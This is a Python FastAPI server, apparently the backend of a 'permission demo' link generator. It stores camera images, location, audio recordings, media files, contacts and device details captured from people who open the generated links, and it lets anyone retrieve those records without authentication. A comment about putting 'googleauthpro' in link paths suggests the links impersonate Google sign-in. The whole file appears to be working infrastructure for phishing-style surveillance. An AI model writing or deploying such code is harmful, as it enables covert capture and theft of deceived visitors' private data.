from fastapi import FastAPI, APIRouter, HTTPException, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Any
import uuid
from datetime import datetime, timezone
import secrets


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Base URL used to construct working demo links.
# We use the deployed FRONTEND_URL so the links actually resolve to our app,
# and include "googleauthpro" in the path for branding.
DEMO_BASE_URL = os.environ.get('FRONTEND_URL', '').rstrip('/')

# Define Models
class DeviceInfo(BaseModel):
    deviceType: str
    browser: str
    os: str

class DemoLink(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    demo_code: str
    original_url: str
    permissions: List[str]
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    visits: int = 0

class DemoLinkCreate(BaseModel):
    original_url: str
    permissions: List[str]

class DemoLinkResponse(BaseModel):
    demo_code: str
    demo_url: str
    original_url: str
    permissions: List[str]

class VisitLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    demo_code: str
    permissions_granted: List[str]
    permissions_denied: List[str]
    camera_images: Optional[List[str]] = []
    location_data: Optional[Any] = None
    audio_data: Optional[str] = None
    media_files: Optional[List[Any]] = []
    contacts: Optional[List[Any]] = []
    device_info: Optional[Any] = None
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class VisitLogCreate(BaseModel):
    demo_code: str
    permissions_granted: List[str]
    permissions_denied: List[str]
    camera_images: Optional[List[str]] = []
    location_data: Optional[Any] = None
    audio_data: Optional[str] = None
    media_files: Optional[List[Any]] = []
    contacts: Optional[List[Any]] = []
    device_info: Optional[Any] = None

# Routes
@api_router.get("/")
async def root():
    return {"message": "Permission Demo API"}

@api_router.post("/demo-links", response_model=DemoLinkResponse)
async def create_demo_link(input: DemoLinkCreate, request: Request):
    """Create a new demo link with specified permissions"""
    # Generate a unique demo code
    demo_code = secrets.token_urlsafe(8)
    
    demo_link = DemoLink(
        demo_code=demo_code,
        original_url=input.original_url,
        permissions=input.permissions
    )
    
    # Convert to dict and serialize datetime to ISO string for MongoDB
    doc = demo_link.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    
    await db.demo_links.insert_one(doc)
    
    # Build the demo URL. Prefer FRONTEND_URL env var (set per environment so
    # the link always points at the user-facing host); fall back to the request
    # Origin/Referer only if FRONTEND_URL is unset.
    if DEMO_BASE_URL:
        base = DEMO_BASE_URL
    else:
        origin = request.headers.get('origin') or request.headers.get('referer')
        if origin:
            from urllib.parse import urlparse
            parsed = urlparse(origin)
            base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            base = ""
    demo_url = f"{base.rstrip('/')}/{demo_code}" if base else f"/{demo_code}"
    
    return DemoLinkResponse(
        demo_code=demo_code,
        demo_url=demo_url,
        original_url=input.original_url,
        permissions=input.permissions
    )

@api_router.get("/demo-links/{demo_code}", response_model=DemoLink)
async def get_demo_link(demo_code: str):
    """Get demo link details by code"""
    demo_link = await db.demo_links.find_one({"demo_code": demo_code}, {"_id": 0})
    
    if not demo_link:
        raise HTTPException(status_code=404, detail="Demo link not found")
    
    # Convert ISO string timestamp back to datetime object
    if isinstance(demo_link['created_at'], str):
        demo_link['created_at'] = datetime.fromisoformat(demo_link['created_at'])
    
    # Increment visit count
    await db.demo_links.update_one(
        {"demo_code": demo_code},
        {"$inc": {"visits": 1}}
    )
    
    return demo_link

@api_router.post("/visit-logs", response_model=VisitLog)
async def create_visit_log(input: VisitLogCreate):
    """Log permission grant/deny results"""
    visit_log = VisitLog(
        demo_code=input.demo_code,
        permissions_granted=input.permissions_granted,
        permissions_denied=input.permissions_denied,
        camera_images=input.camera_images or [],
        location_data=input.location_data,
        audio_data=input.audio_data,
        media_files=input.media_files or [],
        contacts=input.contacts or [],
        device_info=input.device_info
    )
    
    # Convert to dict and serialize datetime to ISO string for MongoDB
    doc = visit_log.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    
    await db.visit_logs.insert_one(doc)
    
    return visit_log

@api_router.get("/visit-logs/{demo_code}", response_model=List[VisitLog])
async def get_visit_logs(demo_code: str):
    """Get all visit logs for a demo code"""
    visit_logs = await db.visit_logs.find({"demo_code": demo_code}, {"_id": 0}).to_list(1000)
    
    # Convert ISO string timestamps back to datetime objects
    for log in visit_logs:
        if isinstance(log['timestamp'], str):
            log['timestamp'] = datetime.fromisoformat(log['timestamp'])
    
    # Sort by timestamp descending (newest first)
    visit_logs.sort(key=lambda x: x['timestamp'], reverse=True)
    
    return visit_logs

@api_router.get("/demo-links", response_model=List[DemoLink])
async def get_all_demo_links():
    """Get all demo links"""
    demo_links = await db.demo_links.find({}, {"_id": 0}).to_list(1000)
    
    # Convert ISO string timestamps back to datetime objects
    for link in demo_links:
        if isinstance(link['created_at'], str):
            link['created_at'] = datetime.fromisoformat(link['created_at'])
    
    # Sort by created_at descending (newest first)
    demo_links.sort(key=lambda x: x['created_at'], reverse=True)
    
    return demo_links

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()